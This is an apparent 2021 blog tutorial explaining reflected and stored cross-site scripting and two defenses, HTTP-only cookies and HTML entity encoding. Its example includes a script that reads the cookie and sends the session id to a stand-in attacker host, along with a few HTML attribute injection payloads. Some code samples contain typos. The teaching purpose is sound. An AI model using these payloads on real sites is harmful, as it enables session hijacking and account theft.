---
title: Tackle Cross-Site Scripting Vulnerabilities in Frontend Development
date: 2021-05-20
tags: web development, security, networking
index_img: /images/thumbnail/xss.jpg
---
### How does Cross-Site Scripting work?
Cross-Site Scripting(XSS) is one of the most common security attacks on the client side of the application. XSS attacks is a type of code injection, where the malicious script or a segment of code is injected in the request to the server, and the server response which contains that maliciosus code will be run by victim's browser. Depending on what the injected code does, XSS attacks can cause a wide variety of damages to the victims, including stealing sensentitive user info from cookie, redirecting users to the malicious site built by the attackers, and even internally crashing user's machine by overflowing the memory, and so on.

Suppose you are a user of a financial site A(let's call it doerj.github.io), in which you usually manage your financial products and trade in stock market. After you logged in doerj.github.io, you will be directed to the url: `www.doerj.github.io/index.php?username=<user>` where the query parameter value `user` will be just the placeholder for your actual username, and this url request returns a user landing page with a page title of "Welcome back user!". What happens here, is that when you have filled in your user credentials in the log-in page, the application sends a GET request that contains your username as a query parameter to the server, and retrieve your account info from the database. The server then sends a html template(the user landing page) back to your browser, which parses your username out of the url for displaying the page title. 

Imagine there is a hacker who knows doerj.github.io is exposed with XSS security vulnerabilities, and wants to get your session id so the hacker can access your account as a logged-in user(i.e., pretend to be you). The session id is usually stored in the cookie with the server response, thus in order to get that session id, the hacker needs to make your browser execute a segment of code that extracts the session id from your cookie, and sends it to the hacker's own server. The first step for hacker is to think of a way if injecting his code into your request to doerj.github.io. One of the most common approches of doing that is to send you an anonymous email which contains a malicious url, and triggers you to click on that url. The url will be something like `www.doerj.github.io/index.php?username=<script>getSessonidFromCookie()</script>`. When you click on the url, the html template will try to get your username from the query parameter in the url, which is `<script>getSessionidFromCookie()</script>` in this case. Since the browser has no mechanism to detect whether the script tag in the DOM tree could be trusted or not, the injected script will be executed regardless. The injected script could be as the following:
```javascript
var session_id = documnet.cookie;
fetch('www.hackersite.com', { session: session_id }).then(() => { return; });
```
What the code does is getting your cookie that contains your session id, and send to hacker's server. Now the hacker has your session id, and can store the id in hackers' own browser while making request to doerj.github.io. The server of doerj.github.io sees the session id in hacker's cookie, thus recognizes the hacker as you, and gives the hacker access to your account.

The scenario above is just one type of XSS attacks, which is known as `reflected XSS`. Reflected XSS occurs when the injected code travels with the user request, all the way to the server-side, and is reflected in the server response and finally executed by user's browser. This type of attacks requires certain user action to trigger the code injection, such as clicking on a designated link to inject the malicious script into the url or the request body. There is also `stored XSS` where the script permanantly resides on the server-side. Whenever the infected server receives a user request that contains some user info, the script will act as a man-in-the-middle, intercept the sensentive info that the server fetched from the databse, and send to attack's appointed site. 

### What are the solutions?
##### HTTP-only cookie
HTTP-only is an attribute that can be specified for the cookie. The cookie value with HTTP-only attribute can not be accessed by any script anymore, thus the hacker will not be able to use script or document API to get information from the cookie and send to hacker's own computer. Setting HTTP-only cookie doesn't eliminate XSS attacks from happening, but effectively mitigates the sensitive info from being stolen from the source. The following code sets HTTP-only attribute to cookie using node.js:
```javascript 
cosnt cp = require('cookie-parser');
app.use(cp());

app.post('/example-route', (req, res) => {
  res.cookie('session_id', '123456', {
    httpOnly: true
  });
  res.send('<div>Cookie has been set with HTTP-only!</div>');
})
```

##### Encoding on the output 
To prevent XSS attacks in our applcations, we should have the mindset that each DOM documnet is a HTML template that has slots into which untrusted data can be inserted. When the browser renders a DOM tree, it has no idea whether each data comes from a trusted data source. Therefore, it is important to prevent the browser switching to execution context while rendering HTML template. One way to achieve that is to apply HTML entity encoding to the HTML element content that contains any dynamic data attribute or the data that may comes from a untrusted source. The following characters are encoded with HTML entity and can be used in HTML element content:
```text
 & --> &amp;
 < --> &lt;
 > --> &gt;
 " --> &quot;
 ' --> &#x27;
```

Other than the HTML element content, the HTML attribute values can also be the place to inject javascript code using `javascript pseudo protcol`. For example:
```html
<div>
  <a href="javascript:injectCode()"></a>
  <div onclick="javascript:injectCode()"></div>
  <div onerror="javascript:injectCode()"></div>
  <img src onerror="alert('XSS')"/>
</div>
```
Therefore, the values should also be encoded before being put into HTML attributes. 


